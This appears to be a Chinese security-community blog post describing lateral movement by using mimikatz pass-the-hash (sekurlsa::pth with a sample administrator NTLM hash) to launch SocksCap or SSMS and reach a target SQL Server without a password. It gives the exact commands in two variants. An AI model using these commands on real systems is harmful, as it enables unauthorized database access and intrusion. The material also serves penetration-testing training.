#  横向渗透 | 无密码连接SQL Server的姿势

zksmile  [ sechub安全 ](javascript:void\(0\);)

**sechub安全** ![]()

微信号 secevery0x01

功能介绍
隶属于SecHub网络安全社区，致力于研究渗透测试、红蓝对抗、应急响应、实战案例、钓鱼社工、和漏洞分析，定期分享实战案例、技术教程、安全工具等前沿网络安全资源。

____

___发表于_

收录于合集 #内网渗透 10个

**     点击蓝字 关注我们**

![](https://gitee.com/fuli009/images/raw/master/public/20230619141946.png)

 **免责声明**

本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。

如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。

文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。

# 一、前言

原理：mssql支持Windows身份验证登录（微软工具ssms支持），很多win机器上都是用administrator用户默认安装的，也就是说只要拿到目标administrator用户的hash，就可以利用本地hash注入，通过socks代理直连目标mssql

# 二、SocksCap

操作流程：用hash注入启动sockscap，把ssms拖到sockscap中启动，连接目标mssql。

分析：为什么要注入启动sockscap，这样在sockscap中启用ssms会自动继承sockscap进程的权限。通过进程分析发现ssms的父进程是sockscap。

## 1.打开mimikatz，hash注入sockscap

    
    
    privilege::debug  
    sekurlsa::pth /user:administrator /domain:192.168.144.146 /ntlm:518b98ad4178a53695dc997aa02d455c "/run:C:\all\SocksCap64\SocksCap64_RunAsAdmin.exe"  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230619141948.png)

## 2.在sockscap中运行ssms

![](https://gitee.com/fuli009/images/raw/master/public/20230619141949.png)

## 3.输入目标服务器名称，连接即可

![](https://gitee.com/fuli009/images/raw/master/public/20230619141950.png)

![]()

## 4.通过进程分析，发现SSMS的父进程是sockscap

    
    
    wmic process where Name="SSMS.exe" get ParentProcessId  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230619141951.png)

# 三、proxifier

操作流程：打开proxifier。用hash注入启动ssms可连接目标mssql。

分析：sockscap和proxifier的使用方式不同。所以我们只要注入ssms即可。

## 1.启动proxifier

## 2.打开mimikatz，hash注入ssms

    
    
    privilege::debug  
    sekurlsa::pth /user:administrator /domain:192.168.144.146 /ntlm:518b98ad4178a53695dc997aa02d455c "/run:C:\all\ssms\Common7\IDE\Ssms.exe"  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230619141952.png)

## 3.连接

![](https://gitee.com/fuli009/images/raw/master/public/20230619141953.png)

![]()

  

欢迎关注SecHub网络安全社区，SecHub网络安全社区目前邀请式注册，邀请码获取见公众号菜单【邀请码】

 **#**

  

 **企业简介    **

  

 **赛克艾威 - 专注政企安全服务**

 **  
**

       北京赛克艾威科技有限公司（简称：赛克艾威），成立于2016年9月，具有中国网络安全审查技术与认证中心安全风险评估服务三级资质CCRC，信息安全保障人员资质CISAW（安全评估专家级）。

  

安全评估|渗透测试|漏洞扫描|安全巡检

代码审计|钓鱼演练|应急响应|安全运维

重大时刻安保|企业安全培训

![](https://gitee.com/fuli009/images/raw/master/public/20230619141946.png)

 **联系方式**

电话｜010-86460828

官网｜https://sechub.com.cn

![](https://gitee.com/fuli009/images/raw/master/public/20230619141955.png)

 **关注我们**

![](https://gitee.com/fuli009/images/raw/master/public/20230619141956.png)![](https://gitee.com/fuli009/images/raw/master/public/20230619141956.png)![](https://gitee.com/fuli009/images/raw/master/public/20230619141957.png)

 **公众号：** sechub安全

 **哔哩号：** SecHub官方账号

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

